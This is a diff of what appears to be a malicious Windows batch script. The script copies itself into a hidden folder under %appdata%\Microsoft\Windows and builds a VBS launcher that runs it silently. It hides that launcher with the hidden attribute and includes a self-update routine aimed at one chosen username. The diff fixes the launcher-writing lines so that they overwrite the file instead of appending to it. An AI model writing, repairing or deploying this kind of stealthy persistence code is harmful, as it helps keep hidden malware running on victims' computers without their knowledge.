@@ -182,16 +182,15 @@ set "vpath=%appdata%\Microsoft\Windows"
 :: Copy the batch to the hidden location
 if not "%cd%"=="%vpath%" (
  2>NUL del /ah "%vpath%\%bname%"
- >NUL copy "%~f0" "%vpath%\%bname%"
+  >NUL copy "%~f0" "%vpath%\%bname%"
 )
 
 if "%updateurl%"=="" (
-	
 	:normalrecurring
-	echo set WshShell = wscript.createobject^("WScript.shell"^)>> %vpath%\%vname%
+	echo set WshShell = wscript.createobject^("WScript.shell"^)> %vpath%\%vname%
 	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> %vpath%\%vname%
 	echo set WshShell = Nothing>> %vpath%\%vname%
-
+	
 	:: DO NOT REMOVE
 	goto skipupdateconfig
 	
@@ -202,9 +201,7 @@ goto dontremoveme
 
 :: IF TARGET USERNAME IS SET
 if "%targetusername%"=="" (
-	
 	goto nontargetedupdate 
-	
 ) else ( goto targetedupdate )
 
 goto dontremoveme2
@@ -214,7 +211,7 @@ goto dontremoveme2
 IF EXIST "%vpath%\temp.txt" 2>NUL del %vpath%\temp.txt
 
 :: Change VBS
-echo set WshShell = wscript^.createobject^("WScript.shell"^)>> %vpath%\%vname%
+echo set WshShell = wscript^.createobject^("WScript.shell"^)> %vpath%\%vname%
 echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> %vpath%\%vname%
 echo set WshShell = Nothing>> %vpath%\%vname%
 
@@ -235,13 +232,13 @@ echo 2^>NUL del %bname%>> %vpath%\%uname%
 echo ren temp.txt %bname%>> %vpath%\%uname%
 echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
 echo break^>%vname%>> %vpath%\%uname%
-echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
 echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
 echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
 echo start %vname%>> %vpath%\%uname%
 echo timeout 1 ^>nul>> %vpath%\%uname%
 echo break^>%vname%>> %vpath%\%uname%
-echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
 echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
 echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
 echo ^>NUL attrib %vpath%\%vname% +h>> %vpath%\%uname%
@@ -263,7 +260,7 @@ IF "%USERNAME%"=="%targetusername%" (
 	IF EXIST "%vpath%\temp.txt" 2>NUL del %vpath%\temp.txt
 
 	:: Change VBS
-	echo set WshShell = wscript^.createobject^("WScript.shell"^)>> %vpath%\%vname%
+	echo set WshShell = wscript^.createobject^("WScript.shell"^)> %vpath%\%vname%
 	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> %vpath%\%vname%
 	echo set WshShell = Nothing>> %vpath%\%vname%
 
@@ -284,13 +281,13 @@ IF "%USERNAME%"=="%targetusername%" (
 	echo ren temp.txt %bname%>> %vpath%\%uname%
 	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
 	echo break^>%vname%>> %vpath%\%uname%
-	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
+	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo start %vname%>> %vpath%\%uname%
 	echo timeout 1 ^>nul>> %vpath%\%uname%
 	echo break^>%vname%>> %vpath%\%uname%
-	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
+	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo ^>NUL attrib %vpath%\%vname% +h>> %vpath%\%uname%
@@ -303,7 +300,6 @@ IF "%USERNAME%"=="%targetusername%" (
 	goto skipupdateconfig
 ) else ( goto normalrecurring )
 :dontremoveme3
-
 :dontremoveme
 :skipupdateconfig
 
